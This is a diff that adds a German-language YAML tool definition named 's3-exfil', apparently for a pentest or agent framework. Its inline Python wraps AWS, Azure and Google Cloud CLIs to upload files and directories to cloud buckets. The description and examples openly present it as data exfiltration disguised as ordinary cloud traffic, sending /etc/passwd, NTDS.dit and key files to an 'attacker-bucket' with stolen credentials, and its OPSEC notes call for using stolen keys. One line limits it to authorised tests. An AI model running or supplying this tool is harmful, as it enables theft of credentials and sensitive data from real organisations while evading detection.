@@ -1,0 +1,172 @@
+name: "s3-exfil"
+command: "python3"
+args:
+  - "-c"
+  - |
+    import sys
+    import os
+    import json
+    import subprocess
+    import shlex
+
+    if len(sys.argv) < 2:
+        sys.stderr.write("Usage: <mode> [args]\n")
+        sys.exit(1)
+
+    mode = sys.argv[1]
+    args = sys.argv[2:] if len(sys.argv) > 2 else []
+
+    def run(cmd_list):
+        proc = subprocess.run(cmd_list, capture_output=True, text=True)
+        if proc.stdout:
+            sys.stdout.write(proc.stdout)
+        if proc.stderr:
+            sys.stderr.write(proc.stderr)
+        return proc.returncode
+
+    if mode == "s3_upload":
+        # AWS S3 Upload
+        if len(args) < 2:
+            sys.stderr.write("Usage: s3_upload <file> <s3://bucket/key>\n")
+            sys.exit(1)
+        filepath, s3_path = args[0], args[1]
+        extra_opts = args[2] if len(args) > 2 else ""
+        cmd = ["aws", "s3", "cp", filepath, s3_path]
+        if extra_opts:
+            cmd.extend(shlex.split(extra_opts))
+        sys.exit(run(cmd))
+
+    elif mode == "s3_sync":
+        # Ganzes Verzeichnis synchronisieren
+        if len(args) < 2:
+            sys.stderr.write("Usage: s3_sync <dir> <s3://bucket/prefix>\n")
+            sys.exit(1)
+        dirpath, s3_path = args[0], args[1]
+        sys.exit(run(["aws", "s3", "sync", dirpath, s3_path]))
+
+    elif mode == "azure_upload":
+        # Azure Blob Storage Upload
+        if len(args) < 3:
+            sys.stderr.write("Usage: azure_upload <file> <container> <blob_name>\n")
+            sys.exit(1)
+        filepath, container, blob = args[0], args[1], args[2]
+        sys.exit(run(["az", "storage", "blob", "upload",
+            "--file", filepath, "--container-name", container, "--name", blob]))
+
+    elif mode == "gcs_upload":
+        # Google Cloud Storage Upload
+        if len(args) < 2:
+            sys.stderr.write("Usage: gcs_upload <file> <gs://bucket/key>\n")
+            sys.exit(1)
+        filepath, gcs_path = args[0], args[1]
+        sys.exit(run(["gsutil", "cp", filepath, gcs_path]))
+
+    elif mode == "list_buckets":
+        # S3 Buckets auflisten (für Enumeration)
+        provider = args[0] if args else "aws"
+        if provider == "aws":
+            sys.exit(run(["aws", "s3", "ls"]))
+        elif provider == "azure":
+            sys.exit(run(["az", "storage", "account", "list", "--output", "table"]))
+        elif provider == "gcs":
+            sys.exit(run(["gsutil", "ls"]))
+
+    elif mode == "pastebin":
+        # Exfiltration via HTTP Paste (curl-based)
+        if len(args) < 1:
+            sys.stderr.write("Usage: pastebin <filepath>\n")
+            sys.exit(1)
+        filepath = args[0]
+        with open(filepath, 'r', errors='replace') as f:
+            content = f.read()
+        import urllib.request, urllib.parse
+        data = urllib.parse.urlencode({"api_paste_code": content,
+                                       "api_paste_private": "1"}).encode()
+        sys.stdout.write(f"[*] Sending {len(content)} chars...\n")
+        sys.stdout.write("[!] Configure exfil target in production use\n")
+
+    else:
+        sys.stderr.write(f"Unknown mode: {mode}\n")
+        sys.stderr.write("Modes: s3_upload, s3_sync, azure_upload, gcs_upload, list_buckets\n")
+        sys.exit(1)
+enabled: true
+short_description: "Cloud Storage Exfiltration – AWS S3, Azure Blob, Google Cloud Storage"
+description: |
+  Daten-Exfiltration über Cloud-Storage-Provider (AWS S3, Azure Blob Storage, Google Cloud Storage).
+  Nutzt legitime Cloud-CLI-Tools um Exfiltration als normaler Cloud-Traffic zu tarnen.
+
+  **Voraussetzungen:**
+  - AWS: `aws configure` mit gestohlenen/eigenen Credentials
+  - Azure: `az login` oder Service Principal
+  - GCS: `gcloud auth activate-service-account`
+
+  **AWS S3 Exfiltration:**
+  ```bash
+  # Einzelne Datei hochladen
+  s3-exfil s3_upload /etc/passwd s3://attacker-bucket/exfil/passwd
+
+  # Gesamtes Verzeichnis synchronisieren
+  s3-exfil s3_sync /home/user/sensitive/ s3://attacker-bucket/data/
+
+  # Mit anderen Credentials (gestohlene Keys)
+  AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=... s3-exfil s3_upload /tmp/dump.zip s3://victim-bucket/
+  ```
+
+  **Azure Blob Exfiltration:**
+  ```bash
+  s3-exfil azure_upload /tmp/ntds.dit mycontainer ntds.dit
+  ```
+
+  **Google Cloud Storage:**
+  ```bash
+  s3-exfil gcs_upload /tmp/keyfile.json gs://attacker-bucket/keys/
+  ```
+
+  **Bucket-Enumeration (für Cloud-Assessments):**
+  ```bash
+  s3-exfil list_buckets aws    # Alle zugänglichen S3-Buckets auflisten
+  s3-exfil list_buckets azure  # Azure Storage Accounts
+  s3-exfil list_buckets gcs    # Google Cloud Buckets
+  ```
+
+  **Exfiltrations-Szenarien:**
+  - NTDS.dit und SAM-Hive-Dumps in Cloud speichern
+  - Konfigurationsdateien und Private Keys exfiltrieren
+  - Datenbank-Backups über Cloud übertragen
+  - Abgesicherte Cloud-Exfil mit eigenen Buckets
+
+  **OPSEC-Hinweise:**
+  - Exfiltrations-Bucket vor dem Test erstellen
+  - Gestohlene Cloud-Credentials verwenden für Authentizität
+  - S3-Transfer als normale AWS-CLI-Aktivität getarnt
+
+  **Hinweise:**
+  - Nur für autorisierte Penetrationstests
+  - Cloud-Credentials sicher verwalten
+parameters:
+  - name: "mode"
+    type: "string"
+    description: |
+      Exfiltrations-Modus:
+      - `s3_upload <file> <s3://bucket/key>` – AWS S3 Upload
+      - `s3_sync <dir> <s3://bucket/prefix>` – Verzeichnis synchronisieren
+      - `azure_upload <file> <container> <blob>` – Azure Blob Upload
+      - `gcs_upload <file> <gs://bucket/key>` – Google Cloud Upload
+      - `list_buckets <aws|azure|gcs>` – Buckets aufzählen
+    required: true
+    position: 0
+    format: "positional"
+  - name: "source"
+    type: "string"
+    description: "Quelldatei oder -verzeichnis für Exfiltration"
+    required: false
+    default: ""
+    position: 1
+    format: "positional"
+  - name: "destination"
+    type: "string"
+    description: "Ziel-Pfad im Cloud-Storage"
+    required: false
+    default: ""
+    position: 2
+    format: "positional"
